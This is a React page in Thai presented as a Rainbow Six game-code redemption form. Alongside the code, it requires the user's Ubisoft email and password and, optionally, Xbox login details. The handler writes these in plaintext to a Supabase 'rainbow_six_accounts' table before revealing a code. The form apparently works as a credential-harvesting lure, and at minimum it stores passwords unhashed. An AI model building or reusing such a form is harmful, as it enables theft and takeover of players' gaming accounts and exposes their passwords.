import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { AlertCircle, CheckCircle2, Gift, ArrowLeft, GamepadIcon } from "lucide-react";
import { Link } from "react-router-dom";
import { supabase } from "@/lib/supabase";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";

export default function RainbowSixRedemption() {
  const [ubisoftEmail, setUbisoftEmail] = useState("");
  const [ubisoftPassword, setUbisoftPassword] = useState("");
  const [rainbowSixUsername, setRainbowSixUsername] = useState("");
  const [hasXboxAccount, setHasXboxAccount] = useState(false);
  const [xboxEmail, setXboxEmail] = useState("");
  const [xboxPassword, setXboxPassword] = useState("");
  
  const [redeemCode, setRedeemCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const [showCodeDialog, setShowCodeDialog] = useState(false);
  const [gameInfo, setGameInfo] = useState<{
    code: string;
    instruction: string;
  } | null>(null);

  const handleRedeemCode = async () => {
    if (!redeemCode.trim()) {
      setError("กรุณากรอกโค้ดเกม Rainbow Six");
      return;
    }

    if (!ubisoftEmail.trim()) {
      setError("กรุณากรอกอีเมล Ubisoft");
      return;
    }

    if (!ubisoftPassword.trim()) {
      setError("กรุณากรอกรหัสผ่าน Ubisoft");
      return;
    }

    if (!rainbowSixUsername.trim()) {
      setError("กรุณากรอกชื่อผู้เล่นในเกม Rainbow Six");
      return;
    }

    if (hasXboxAccount) {
      if (!xboxEmail.trim()) {
        setError("กรุณากรอกอีเมล Xbox");
        return;
      }
      
      if (!xboxPassword.trim()) {
        setError("กรุณากรอกรหัสผ่าน Xbox");
        return;
      }
    }

    setLoading(true);
    setError(null);
    setSuccess(false);
    
    try {
      // First check if the code exists and is not used
      const { data: codeData, error: fetchError } = await supabase
        .from("rainbow_six_redeem_codes")
        .select("*")
        .eq("code", redeemCode)
        .eq("is_used", false)
        .single();

      if (fetchError) {
        if (fetchError.code === "PGRST116") {
          setError("โค้ดไม่ถูกต้องหรือถูกใช้งานไปแล้ว");
        } else {
          throw fetchError;
        }
        return;
      }

      // Get current user information
      const { data: { user } } = await supabase.auth.getUser();
      
      if (!user) {
        setError("กรุณาเข้าสู่ระบบก่อนใช้โค้ดแลกรับ");
        return;
      }

      // Save the user account information
      const { error: insertError } = await supabase
        .from("rainbow_six_accounts")
        .insert({
          user_id: user.id,
          ubisoft_email: ubisoftEmail,
          ubisoft_password: ubisoftPassword,
          rainbow_six_username: rainbowSixUsername,
          has_xbox_account: hasXboxAccount,
          xbox_email: hasXboxAccount ? xboxEmail : null,
          xbox_password: hasXboxAccount ? xboxPassword : null,
          created_at: new Date().toISOString()
        });

      if (insertError) {
        throw insertError;
      }

      // Mark the code as used
      const { error: updateError } = await supabase
        .from("rainbow_six_redeem_codes")
        .update({
          is_used: true,
          used_by: user.id,
          used_at: new Date().toISOString(),
          updated_at: new Date().toISOString()
        })
        .eq("id", codeData.id);

      if (updateError) {
        throw updateError;
      }

      // Set success and game info for popup
      setGameInfo({
        code: codeData.game_code,
        instruction: codeData.redemption_instruction || "นำรหัสไปใช้งานในเกม Rainbow Six ได้ทันที"
      });
      
      setSuccess(true);
      setShowCodeDialog(true);
      setRedeemCode("");
      setUbisoftEmail("");
      setUbisoftPassword("");
      setRainbowSixUsername("");
      setHasXboxAccount(false);
      setXboxEmail("");
      setXboxPassword("");
      
    } catch (error) {
      console.error("Error redeeming Rainbow Six code:", error);
      setError("ไม่สามารถแลกรับโค้ดได้ โปรดลองใหม่อีกครั้ง");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900 p-2 md:p-4 relative overflow-hidden">
      {/* Background decoration */}
      <div className="absolute inset-0 bg-[url('data:image/svg+xml,%3Csvg%20width%3D%2260%22%20height%3D%2260%22%20viewBox%3D%220%200%2060%2060%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Cg%20fill%3D%22%239C92AC%22%20fill-opacity%3D%220.05%22%3E%3Ccircle%20cx%3D%2230%22%20cy%3D%2230%22%20r%3D%224%22/%3E%3C/g%3E%3C/g%3E%3C/svg%3E')]"></div>
      
      <div className="max-w-md mx-auto space-y-6 md:space-y-8 relative z-10">
        {/* Header */}
        <div className="text-center space-y-4 pt-6 md:pt-12 px-2">
          <div className="flex justify-center mb-4">
            <div className="w-12 h-12 md:w-16 md:h-16 bg-gradient-to-br from-blue-500 to-orange-500 rounded-full flex items-center justify-center shadow-2xl">
              <GamepadIcon className="w-6 h-6 md:w-8 md:h-8 text-white" />
            </div>
          </div>
          <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold bg-gradient-to-r from-blue-400 via-orange-500 to-red-500 bg-clip-text text-transparent leading-tight">
            แลกรับโค้ด Rainbow Six
          </h1>
          <p className="text-white/70 text-base md:text-xl max-w-2xl mx-auto leading-relaxed px-4">
            กรอกข้อมูลของคุณเพื่อแลกรับโค้ดเกม Rainbow Six
          </p>
        </div>

        <Card className="shadow-2xl border-0 bg-white/10 backdrop-blur-xl border border-white/20">
          <CardHeader className="p-4 md:p-6">
            <CardTitle className="text-xl md:text-2xl text-white text-center">แลกรับโค้ด Rainbow Six</CardTitle>
            <CardDescription className="text-white/70 text-center text-sm md:text-base">
              กรอกข้อมูลบัญชี Ubisoft ของคุณและโค้ดที่ได้รับ
            </CardDescription>
          </CardHeader>
          <CardContent className="p-4 md:p-6 space-y-6">
            {error && (
              <Alert variant="destructive" className="mb-4 border-red-500/50 bg-red-500/10 backdrop-blur-md">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription className="text-red-300">{error}</AlertDescription>
              </Alert>
            )}
            
            {success && !showCodeDialog && (
              <Alert className="mb-4 border-green-500/50 bg-green-500/10 backdrop-blur-md">
                <CheckCircle2 className="h-4 w-4 text-green-400" />
                <AlertDescription className="text-green-300">
                  แลกรับโค้ดสำเร็จ!
                </AlertDescription>
              </Alert>
            )}
            
            <div className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="ubisoft-email" className="text-white/80">อีเมล Ubisoft</Label>
                <Input
                  id="ubisoft-email"
                  type="email"
                  value={ubisoftEmail}
                  onChange={(e) => setUbisoftEmail(e.target.value)}
                  placeholder="email@example.com"
                  className="border-white/20 bg-white/10 text-white placeholder:text-white/50 focus:border-blue-500 focus:ring-blue-500/50"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="ubisoft-password" className="text-white/80">รหัสผ่าน Ubisoft</Label>
                <Input
                  id="ubisoft-password"
                  type="password"
                  value={ubisoftPassword}
                  onChange={(e) => setUbisoftPassword(e.target.value)}
                  placeholder="••••••••"
                  className="border-white/20 bg-white/10 text-white placeholder:text-white/50 focus:border-blue-500 focus:ring-blue-500/50"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="rainbow-six-username" className="text-white/80">ชื่อในเกม Rainbow Six</Label>
                <Input
                  id="rainbow-six-username"
                  value={rainbowSixUsername}
                  onChange={(e) => setRainbowSixUsername(e.target.value)}
                  placeholder="ชื่อในเกม"
                  className="border-white/20 bg-white/10 text-white placeholder:text-white/50 focus:border-blue-500 focus:ring-blue-500/50"
                />
              </div>

              <div className="space-y-2">
                <div className="flex items-center space-x-2 mb-2">
                  <Checkbox 
                    id="xbox-check" 
                    checked={hasXboxAccount} 
                    onCheckedChange={(checked) => setHasXboxAccount(checked === true)}
                  />
                  <Label htmlFor="xbox-check" className="text-white/80">ฉันมีการเชื่อมต่อกับบัญชี Xbox</Label>
                </div>
                
                {hasXboxAccount && (
                  <div className="space-y-4 pl-6 border-l-2 border-white/10 mt-4">
                    <div className="space-y-2">
                      <Label htmlFor="xbox-email" className="text-white/80">อีเมล Xbox</Label>
                      <Input
                        id="xbox-email"
                        type="email"
                        value={xboxEmail}
                        onChange={(e) => setXboxEmail(e.target.value)}
                        placeholder="xbox@example.com"
                        className="border-white/20 bg-white/10 text-white placeholder:text-white/50 focus:border-green-500 focus:ring-green-500/50"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label htmlFor="xbox-password" className="text-white/80">รหัสผ่าน Xbox</Label>
                      <Input
                        id="xbox-password"
                        type="password"
                        value={xboxPassword}
                        onChange={(e) => setXboxPassword(e.target.value)}
                        placeholder="••••••••"
                        className="border-white/20 bg-white/10 text-white placeholder:text-white/50 focus:border-green-500 focus:ring-green-500/50"
                      />
                    </div>
                  </div>
                )}
              </div>
              
              <div className="space-y-2 pt-2">
                <Label htmlFor="redeem-code" className="text-white/80">โค้ดแลกรับ Rainbow Six</Label>
                <Input
                  id="redeem-code"
                  value={redeemCode}
                  onChange={(e) => setRedeemCode(e.target.value)}
                  placeholder="กรอกโค้ดแลกรับ"
                  className="border-white/20 bg-white/10 text-white placeholder:text-white/50 focus:border-blue-500 focus:ring-blue-500/50 h-11 md:h-12 text-sm md:text-base backdrop-blur-md text-center font-mono uppercase"
                />
              </div>
            </div>
            
            <Button 
              onClick={handleRedeemCode} 
              className="w-full mt-6 bg-gradient-to-r from-blue-600 via-orange-600 to-red-600 hover:from-blue-700 hover:via-orange-700 hover:to-red-700 text-white font-bold py-3 md:py-4 text-lg md:text-xl shadow-2xl hover:shadow-blue-500/25 transition-all duration-300 hover:scale-105 rounded-xl" 
              disabled={loading}
            >
              {loading ? (
                <div className="flex items-center justify-center gap-2">
                  <div className="w-4 h-4 md:w-5 md:h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                  <span className="text-sm md:text-base">กำลังตรวจสอบ...</span>
                </div>
              ) : (
                <div className="flex items-center justify-center gap-2">
                  <GamepadIcon className="w-4 h-4 md:w-5 md:h-5" />
                  <span className="text-sm md:text-base">แลกรับโค้ด</span>
                </div>
              )}
            </Button>

            <div className="flex justify-center mt-6">
              <Button variant="ghost" className="text-white hover:bg-white/10" asChild>
                <Link to="/" className="flex items-center gap-2">
                  <ArrowLeft className="w-4 h-4" />
                  กลับไปหน้าแรก
                </Link>
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
      
      {/* Game Code Dialog */}
      <Dialog open={showCodeDialog} onOpenChange={setShowCodeDialog}>
        <DialogContent className="sm:max-w-md bg-white/95 backdrop-blur-xl border border-white/20">
          <DialogHeader>
            <DialogTitle className="text-blue-600 text-xl">🎮 แลกรับโค้ด Rainbow Six สำเร็จ!</DialogTitle>
            <DialogDescription className="text-gray-600">
              โค้ดเกมของคุณ
            </DialogDescription>
          </DialogHeader>
          
          {gameInfo && (
            <div className="p-4 border rounded-lg bg-gray-50">
              <div className="space-y-3">
                <div>
                  <p className="text-sm text-gray-500 font-medium">โค้ดเกม Rainbow Six:</p>
                  <div className="bg-white p-3 rounded border font-mono text-lg mt-1 text-center tracking-wider">
                    {gameInfo.code}
                  </div>
                </div>
                <div>
                  <p className="text-sm text-gray-500 font-medium">วิธีการใช้งาน:</p>
                  <div className="bg-white p-3 rounded border mt-1">
                    {gameInfo.instruction}
                  </div>
                </div>
              </div>
            </div>
          )}
          
          <div className="bg-yellow-50 p-3 rounded-lg border border-yellow-200">
            <p className="text-sm text-yellow-800 font-medium">
              ⚠️ คำเตือน: กรุณาบันทึกข้อมูลนี้ทันที เมื่อปิดหน้าต่างแล้วจะไม่สามารถดูได้อีก
            </p>
          </div>
          
          <DialogFooter className="mt-4">
            <Button 
              onClick={(e) => {
                e.preventDefault();
                setShowCodeDialog(false);
              }} 
              className="w-full bg-gradient-to-r from-blue-600 to-orange-600 hover:from-blue-700 hover:to-orange-700"
            >
              เสร็จสิ้น
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}